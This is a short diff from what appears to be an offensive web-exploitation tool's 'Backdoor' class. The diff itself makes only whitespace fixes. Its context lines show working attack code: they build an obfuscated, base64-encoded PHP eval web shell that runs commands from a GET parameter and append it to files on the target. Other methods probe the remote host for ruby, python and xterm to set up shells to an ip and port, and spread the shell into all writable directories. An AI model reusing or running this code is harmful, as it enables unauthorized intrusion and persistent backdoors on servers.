@@ -144,7 +144,7 @@ class Backdoor(object):
             caseShell=random.choice(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in 'php eval(base64_decode'))))
             payload = "{0}($_GET['{1}'].';');".format(casePayload, parameter)
             payloadEncoded = base64.b64encode(payload).format(payload)
-            evilFile= "<?{0}(\"{1}\")); ?>".format(caseShell, payloadEncoded)
+            evilFile = "<?{0}(\"{1}\")); ?>".format(caseShell, payloadEncoded)
             cmd = 'echo \'{0}\' >> \"{1}\"'.format(evilFile, location)
             make_request.get_page_source(cmd)
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
@@ -196,7 +196,7 @@ class Backdoor(object):
         else:
             print '\n{0}[!] Didn\'t find python on the remote system{1}'.format(Colors.RED, Colors.END)
 
-            
+
     def ruby(self, ip, port):
         cmd = "for x in `whereis ruby`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         ruby = make_request.get_page_source(cmd)
@@ -216,7 +216,7 @@ class Backdoor(object):
         else:
             print '\n{0}[!] Didn\'t find ruby on the remote system{1}'.format(Colors.RED, Colors.END)
 
-            
+
     # A method to spread the shell in all writable directories
     def spread(self):
         provided_shell_name = raw_input('\n{0}[?] Current shell name{1}: '.format(Colors.GREEN, Colors.END))
@@ -234,7 +234,7 @@ class Backdoor(object):
         else:
             print '\n{0}[!] Something went wrong while spreading shell{1}'.format(Colors.RED, Colors.END)
 
-            
+
     def xterm(self, ip):
         cmd = "for x in `whereis xterm`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         xterm = make_request.get_page_source(cmd)
